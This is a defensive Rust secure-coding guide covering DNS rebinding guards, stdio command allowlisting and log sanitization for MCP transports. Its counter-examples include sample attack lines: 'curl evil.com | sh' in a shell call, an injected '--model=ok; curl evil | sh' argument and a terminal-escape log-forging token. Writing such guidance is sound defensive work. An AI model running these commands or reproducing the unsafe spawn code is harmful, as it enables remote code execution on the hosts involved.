# Network & Protocol Hardening (Rust)

MCP / HTTP / stdio transport hardening patterns for the Kailash Rust SDK. These rules prevent DNS rebinding, command injection via stdio transport, and log poisoning across every network-facing crate (kailash-nexus, kailash-mcp, trust-plane, kailash-align-serving).

Origin: R3 red team round (2026-04-12) — fixes in commits `173d054b`, `0d4ebd12`. Journal entries `0021-RISK-r3-timing-leak-mcp-auth.md`, `0022-GAP-source-protection-doc-30-crates-missing.md`. Three distinct classes: (1) transport origin validation, (2) stdio argv/env allowlisting, (3) log content sanitization.

## Rule 1: DNS Rebinding Guard on HTTP MCP Transport

HTTP MCP transports MUST validate the `Host` / `Origin` header against a configured allowlist BEFORE dispatching any JSON-RPC method. Trusting whatever `localhost` resolves to at connect time is the DNS rebinding attack surface.

```rust
// DO — explicit allowlist, checked on every request
pub struct McpHttpTransport {
    allowed_origins: HashSet<String>,  // e.g. {"http://127.0.0.1:8080", "http://localhost:8080"}
}

impl McpHttpTransport {
    async fn handle(&self, req: Request) -> Response {
        let origin = req.headers().get("origin")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");
        if !self.allowed_origins.contains(origin) {
            return Response::builder()
                .status(StatusCode::FORBIDDEN)
                .body("origin not allowed".into())
                .unwrap();
        }
        // ... dispatch
    }
}

// DO NOT — trust any request that reaches the bind address
async fn handle(req: Request) -> Response {
    // Runs on 127.0.0.1:8080 — "trusted" because localhost
    // Attack: attacker-controlled DNS name resolves to 127.0.0.1,
    // served from evil.com, browser sends Origin: https://evil.com,
    // MCP happily dispatches tool calls on behalf of the attacker.
    dispatch(req).await
}
```

**Why**: Local-only MCP servers bind to `127.0.0.1` and assume all traffic is trusted. DNS rebinding lets a malicious website get the browser to POST JSON-RPC to `127.0.0.1` with the attacker's cookies/origin. Without `Origin` validation, any website the user visits while an MCP server runs can invoke MCP tools — a full remote code execution against local infrastructure.

**Configuration contract**: `allowed_origins` MUST be non-empty. Empty = default-deny (consistent with `fail-closed-defaults-rs.md`). For local dev, the set typically contains `http://127.0.0.1:<port>` and `http://localhost:<port>` — nothing else.

## Rule 2: Stdio Transport Argv / Env Allowlist

Stdio MCP transports MUST validate every `command`, `args` entry, and environment variable key against a strict allowlist. Spawning an arbitrary process from a caller-supplied string is BLOCKED.

```rust
// DO — allowlist per command, reject unknown flags
pub struct StdioMcpSpawnConfig {
    allowed_commands: HashMap<String, CommandSpec>,
}

pub struct CommandSpec {
    pub executable: PathBuf,
    pub allowed_arg_patterns: Vec<Regex>,  // e.g. ^--model=[a-zA-Z0-9._-]+$
    pub allowed_env_keys: HashSet<String>, // e.g. {"RUST_LOG", "MODEL_PATH"}
}

impl StdioMcpSpawnConfig {
    pub fn validate(&self, cmd: &str, args: &[String], env: &HashMap<String, String>)
        -> Result<&CommandSpec, SpawnError>
    {
        let spec = self.allowed_commands.get(cmd)
            .ok_or_else(|| SpawnError::CommandNotAllowed(cmd.to_string()))?;

        for arg in args {
            let matches = spec.allowed_arg_patterns.iter()
                .any(|re| re.is_match(arg));
            if !matches {
                return Err(SpawnError::ArgNotAllowed(arg.clone()));
            }
        }

        for key in env.keys() {
            if !spec.allowed_env_keys.contains(key) {
                return Err(SpawnError::EnvKeyNotAllowed(key.clone()));
            }
        }

        Ok(spec)
    }
}

// DO NOT — spawn whatever the JSON-RPC request asked for
async fn spawn_stdio(req: SpawnRequest) -> Result<Child, SpawnError> {
    Command::new(&req.command)  // `sh -c 'curl evil.com | sh'`
        .args(&req.args)        // arbitrary argv
        .envs(&req.env)         // arbitrary env (LD_PRELOAD, PATH, ...)
        .spawn()
}
```

**Why**: Stdio transports are a privileged escalation surface. An MCP client that can specify `command` + `args` + `env` to the server has arbitrary code execution on the server host via `sh -c`, `LD_PRELOAD`, PATH poisoning, or argument injection. The fix is structural: the server knows the small set of commands it will ever spawn (e.g. `kailash-agent`, `llama-server`), and every command has a fixed executable path + regex-validated args + finite env allowlist.

**Regex anchoring**: All patterns MUST be anchored (`^...$`). Unanchored regexes match substrings and let attackers slip `--model=ok; curl evil | sh` past a pattern that was supposed to check `--model=[a-z]+`.

## Rule 3: Log Content Sanitization

Log messages that include user-controlled content MUST either (a) strip control characters and newlines, or (b) log a fingerprint instead of the content. Raw user content in logs is a log-poisoning vector AND leaks secrets into the log pipeline.

```rust
// DO — fingerprint raw content; log key + hash
fn log_rejected_token(token: &str) {
    let fingerprint = format!("{:04x}", simple_hash(token) & 0xFFFF);
    tracing::warn!(
        fingerprint = %fingerprint,
        len = token.len(),
        "rejected token failed validation"
    );
}

fn log_identifier_rejection(identifier: &str) {
    // Only length and fingerprint — the raw identifier is a stored-XSS /
    // log-injection vector if it contains \n\rESC or terminal escapes.
    let fingerprint = format!("{:04x}", simple_hash(identifier) & 0xFFFF);
    tracing::warn!(fingerprint = %fingerprint, "identifier failed validation");
}

// DO NOT — log the raw rejected content
fn log_rejected_token(token: &str) {
    tracing::warn!("rejected token: {}", token);
    // Attacker sets token to "\x1b[2J\x1b[H<fake admin log line>" — their
    // fake line is now in the log stream, indistinguishable from real entries.
}
```

**Why**: Raw content in logs is three problems in one. (1) Control-character injection lets attackers forge log entries. (2) Secret exfiltration — rejected tokens are still credential material and logging them moves them into wider-access log pipelines. (3) Audit poisoning — forged log lines corrupt investigations. Fingerprint-only logging gives operators enough to correlate requests without any of the attack surface.

See also: `rules/dataflow-identifier-safety.md` MUST Rule 2 — `IdentifierError` messages MUST NOT echo the raw input verbatim.

## Audit Protocol

Run before every release touching network-facing crates:

```bash
# 1. HTTP MCP servers must have origin validation
rg 'async fn handle.*Request' crates/kailash-nexus/src/mcp/ crates/kailash-mcp/ -B 2 -A 20 | \
  rg -v 'allowed_origins|origin.*allow|origin.*check'
# Non-empty result = HIGH if the handler dispatches any JSON-RPC method

# 2. Stdio spawn sites must use a validated spec
rg 'Command::new|tokio::process::Command::new' crates/ -B 3 -A 10 | \
  rg -v 'allowed_commands|CommandSpec|validate'
# Non-empty result = HIGH for any site spawning from caller-supplied input

# 3. Log calls including raw credential/token/identifier content
rg 'warn!|error!|info!' crates/ | rg -i 'token|password|secret|api_key|identifier.*{}'
# Any format-interpolation of these names = MEDIUM+; convert to fingerprint logging
```

Any finding is blocking — ship the fix, add a regression test, open an issue on the upstream kailash-py if the same class exists cross-SDK.

## Related

- `skills/18-security-patterns/fail-closed-defaults-rs.md` — allowlist defaults
- `skills/18-security-patterns/constant-time-comparison-rs.md` — credential equality
- `rules/dataflow-identifier-safety.md` — fingerprint-only identifier error messages
- `rules/security.md` — top-level rules
- `crates/kailash-nexus/src/mcp/auth.rs` — reference HTTP transport with origin check
- `crates/kailash-mcp/src/transport/stdio.rs` — reference stdio spawn with allowlist
